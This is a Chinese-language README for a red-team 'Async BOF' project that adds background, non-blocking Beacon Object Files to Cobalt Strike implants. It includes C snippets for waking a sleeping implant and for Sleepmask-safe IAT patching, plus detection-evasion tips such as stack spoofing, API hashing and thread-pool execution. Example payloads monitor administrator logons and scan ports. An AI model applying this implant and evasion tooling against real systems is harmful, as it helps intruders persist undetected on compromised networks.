# Async BOF Implementation

> **基于 Outflank 研究的异步 BOF (Beacon Object Files) 实现**
>
> 允许 BOF 在后台线程中运行，不阻塞主 Beacon，并支持 Sleepmask 兼容性。

## 🎯 核心功能

### 1. **非阻塞执行**
- BOF 在独立的后台线程中运行
- 主 Beacon 可以正常进入 Sleep/Encrypted 状态
- 后台 BOF 继续工作，不影响 Beacon 通信

### 2. **BeaconWakeup() - 立即唤醒机制**
当异步 BOF 检测到关键事件时（如管理员登录），可以立即唤醒处于睡眠状态的主 Beacon：

```c
// 在异步 BOF 中
if (IsAdminLogon()) {
    BeaconPrintf(0, "[ALERT] Admin detected!");

    // 立即唤醒 Beacon
    BeaconWakeup();

    // Beacon 会立即从睡眠中醒来并处理输出
}
```

### 3. **BeaconGetStopJobEvent() - 优雅关闭**
主 Beacon 可以通知后台 BOF 优雅退出，避免资源泄露：

```c
// 在异步 BOF 中
HANDLE hStop = BeaconGetStopJobEvent();

while (TRUE) {
    // 每秒检查一次停止信号
    if (WaitForSingleObject(hStop, 1000) == WAIT_OBJECT_0) {
        // 收到停止信号，清理资源并退出
        CleanupResources();
        break;
    }

    DoMonitoringWork();
}
```

### 4. **Sleepmask 兼容性**
- BOF 调用被重定向到异步安全的代理函数
- 主 Beacon 加密内存时，后台线程仍能正常工作
- 通过 IAT Patching 实现透明的函数替换

### 5. **OPSEC 增强**
- **线程池执行**：使用 Windows ThreadPool API 代替 CreateThread
- **堆栈欺骗**：伪造调用栈，使线程看起来来自合法代码
- **API Hashing**：动态解析 API，避免可疑导入
- **内存保护**：在 Sleepmask 激活时保护 BOF 内存区域

---

## 📁 项目结构

```
Async_BOFs/
├── include/
│   ├── async_bof.h              # BOF 开发者使用的头文件
│   └── async_bof_implant.h      # 植入体端核心接口定义
│
├── src/
│   ├── async_bof_implant.c      # 核心实现（BeaconWakeup、事件管理）
│   ├── coff_patch.c             # COFF IAT Patching（Sleepmask 兼容）
│   └── opsec_optimizations.c    # OPSEC 增强（线程池、堆栈欺骗）
│
├── examples/
│   └── monitor_logon.c          # 示例：监控管理员登录
│
├── IMPLEMENTATION_GUIDE.md      # 详细实现指南
└── README.md                    # 本文件
```

---

## 🚀 快速开始

### 对于 BOF 开发者

#### 1. 编写异步 BOF

```c
#include "async_bof.h"

void bof_main(datap* parser, int argc)
{
    BeaconPrintf(0, "[Async BOF] Starting...\n");

    // 获取停止事件
    HANDLE hStop = BeaconGetStopJobEvent();

    // 主监控循环
    while (WaitForSingleObject(hStop, 1000) != WAIT_OBJECT_0) {
        // 每 1 秒检查一次停止信号

        // 你的监控逻辑
        if (CheckForImportantEvent()) {
            // 检测到重要事件，立即唤醒 Beacon
            ASYNC_ALERT("[ALERT] Important event detected!");
        }
    }

    BeaconPrintf(0, "[Async BOF] Shutting down...\n");
}
```

#### 2. 编译 BOF

使用标准的 BOF 编译流程（参考 Cobalt Strike BOF 文档）。

#### 3. 加载到 Beacon

```
beacon> async_bof monitor_logon.c
[*] Started async job ID 1
[*] BOF running in background
```

### 对于植入体开发者

#### 1. 初始化 Async BOF Manager

在 Beacon 启动时调用：

```c
// 在 beacon 初始化代码中
AsyncBOF_InitializeManager();
```

#### 2. 替换 Sleep 调用

```c
// 旧代码：
Sleep(dwSleepTime);

// 新代码：
DWORD dwResult = AsyncBOF_WaitForWakeup(dwSleepTime);

if (dwResult == WAIT_OBJECT_0) {
    // 被 BOF 唤醒
    AsyncBOF_ProcessAllOutput();
}
```

#### 3. Sleepmask 集成

```c
// 在加密内存之前
AsyncBOF_ProtectMemoryForSleep();
EncryptBeaconMemory();

// ... Beacon 处于加密状态 ...

// 在解密内存之后
DecryptBeaconMemory();
AsyncBOF_RestoreMemoryAfterSleep();
```

---

## 📖 核心接口说明

### BeaconWakeup()

**功能**：唤醒处于睡眠状态的主 Beacon

**签名**：
```c
BOOL BeaconWakeup(void);
```

**返回值**：
- `TRUE`：成功唤醒信号已发送
- `FALSE`：失败（可能事件未初始化）

**使用场景**：
- 检测到管理员登录
- 发现敏感文件访问
- 触发自动化响应条件
- 任何需要立即通知操作员的情况

---

### BeaconGetStopJobEvent()

**功能**：获取当前 BOF 的停止事件句柄

**签名**：
```c
HANDLE BeaconGetStopJobEvent(void);
```

**返回值**：
- 成功：返回事件句柄
- 失败：返回 `NULL`

**使用方式**：
```c
HANDLE hStop = BeaconGetStopJobEvent();
while (WaitForSingleObject(hStop, timeout) != WAIT_OBJECT_0) {
    DoWork();
}
```

---

## 🔧 技术实现细节

### 信号传递机制

```
┌─────────────────┐
│ Async BOF Thread│
└────────┬────────┘
         │ BeaconWakeup()
         ▼
┌─────────────────────────┐
│  Global Wakeup Event    │
│  (Manual Reset Event)   │
└────────┬────────────────┘
         │ SetEvent()
         ▼
┌─────────────────┐
│ Main Beacon     │
│ Waits on Event  │
└─────────────────┘
```

**流程**：
1. Beacon 主线程调用 `AsyncBOF_WaitForWakeup()` 进入等待
2. 后台 BOF 调用 `BeaconWakeup()` → `SetEvent(hGlobalWakeup)`
3. Beacon 主线程从 `WaitForSingleObject()` 返回
4. Beacon 调用 `AsyncBOF_ProcessAllOutput()` 处理待发送数据
5. Beacon 重置事件并继续正常工作

### IAT Patching 原理

**问题**：传统 BOF 直接调用 `BeaconPrintf()`，如果主 Beacon 内存被 Sleepmask 加密，会崩溃。

**解决方案**：在加载 BOF 时，替换导入表中的 Beacon API 地址：

```c
// BOF 原始导入：
BeaconPrintf -> 0x12345678 (Beacon 内存，可能被加密)

// Patch 后：
BeaconPrintf -> 0xABCDEF00 (AsyncBOF_ProxyBeaconPrintf，始终可用)
```

**Patch 流程**：
1. 解析 BOF 的 COFF 格式
2. 定位符号表中的 `BeaconPrintf` 引用
3. 找到所有重定位表项
4. 将地址替换为 `AsyncBOF_ProxyBeaconPrintf`
5. 刷新指令缓存

---

## 🛡️ OPSEC 最佳实践

### 1. 使用线程池代替 CreateThread

```c
// ❌ 不推荐：容易被检测
HANDLE hThread = CreateThread(NULL, 0, BOFEntry, NULL, 0, &tid);

// ✅ 推荐：更隐蔽
PTP_WORK pWork = CreateThreadpoolWork(BOFEntry, NULL, NULL);
SubmitThreadpoolWork(pWork);
```

### 2. 实现堆栈欺骗

使调用栈看起来来自合法代码（如 ntdll.dll）：

```c
// 在 BOF 线程启动时
AsyncBOF_SetupStackSpoofing();
```

### 3. 使用 API Hashing

避免静态导入可疑 API：

```c
// 预计算的哈希（离线计算）
DWORD g_hashCreateEventA = 0x8A31B123;

// 运行时解析
PFN_CREATEEVENTA pCreateEventA =
    GetProcAddressByHash("kernel32.dll", g_hashCreateEventA);
```

### 4. 保护 BOF 内存

在 Sleepmask 激活前后保护 BOF 代码区域：

```c
// 加密前
AsyncBOF_ProtectMemoryForSleep();

// ... Beacon 加密自身内存 ...

// 解密后
AsyncBOF_RestoreMemoryAfterSleep();
```

---

## 📚 示例场景

### 场景 1：监控管理员登录

```c
// monitor_logon.c
void MonitorLogonEvents(void)
{
    HANDLE hStop = BeaconGetStopJobEvent();

    EVT_HANDLE hSub = EvtSubscribe(NULL, NULL, L"Security",
        L"*[System[(EventID=4624)]]",
        NULL, NULL, NULL, EvtSubscribeToFutureEvents);

    while (WaitForSingleObject(hStop, 1000) != WAIT_OBJECT_0) {
        EVT_HANDLE hEvent = EvtNextEvent(hSub, 100);

        if (hEvent && IsAdminLogon(hEvent)) {
            // 立即唤醒 Beacon
            ASYNC_ALERT("[ALERT] Admin logon: %ls", wsUsername);
        }

        if (hEvent) EvtClose(hEvent);
    }
}
```

**使用效果**：
```
beacon> async_bof monitor_logon.c
[*] Started async job 1
beacon> sleep 300
[*] Beacon sleeping for 5 minutes
[... 2 分钟后 ...]
[*] WOKEN UP by async BOF!
[ALERT] Admin logon detected: CORP\Administrator
beacon>
```

### 场景 2：后台端口扫描

```c
// async_portscan.c
void ScanPorts(void)
{
    HANDLE hStop = BeaconGetStopJobEvent();

    for (int port = 1; port <= 65535; port++) {
        if (ASYNC_SHOULD_STOP()) break;

        if (ScanPort(target, port)) {
            BeaconPrintf(0, "[OPEN] Port %d\n", port);
        }

        // 批量唤醒，减少 C2 流量
        if (port % 100 == 0) {
            BeaconWakeup();
        }
    }
}
```

---

## 🐛 故障排查

### 问题：BOF 在 Beacon 睡眠时崩溃

**原因**：BOF 直接调用了 Beacon API，但此时 Beacon 内存已被加密。

**解决方案**：
1. 确认 `AsyncBOF_PatchImports()` 已在 BOF 启动前调用
2. 检查 IAT Patching 是否成功
3. 确认使用异步版本的 Beacon API

### 问题：Beacon 无法被唤醒

**原因**：唤醒事件未正确初始化或未被等待。

**解决方案**：
1. 检查 `AsyncBOF_InitializeWakeupEvent()` 是否在启动时调用
2. 确认 Beacon 主循环使用 `AsyncBOF_WaitForWakeup()` 而非 `Sleep()`
3. 验证事件句柄有效（非 NULL）

### 问题：BOF 无法停止

**原因**：BOF 未频繁检查停止事件。

**解决方案**：
在 BOF 循环中添加更频繁的停止检查：
```c
// 从：WaitForSingleObject(hStop, 60000)  // 60 秒
// 改为：WaitForSingleObject(hStop, 1000) // 1 秒
```

---

## 📖 参考资料

- [Outflank: Async BOFs - Wake Me Up Before You Go-Go](https://www.outflank.nl/blog/2025/07/16/async-bofs-wake-me-up-before-you-go-go/)
- [Cobalt Strike BOF Documentation](https://www.cobaltstrike.com/help-bof)
- Windows Internals (Thread Pool, Events, Memory Management)
- COFF Format Specification

---

## ⚠️ 重要声明

本项目代码仅用于：
- 授权的安全测试
- 教育和研究目的
- 红队演练（在获得明确授权的情况下）

**严禁用于任何非法活动。使用者需承担全部法律责任。**

---

## 📝 许可证

本项目参考 Outflank 的研究，仅供学习和研究使用。

---

**作者**：9Insomnie
**日期**：2025
**版本**：1.0

---

## 🙏 致谢

- **Outflank** - 原始 Async BOF 概念和研究
- **Cobalt Strike** - BOF 技术和框架
- **安全研究社区** - 持续的技术交流和创新
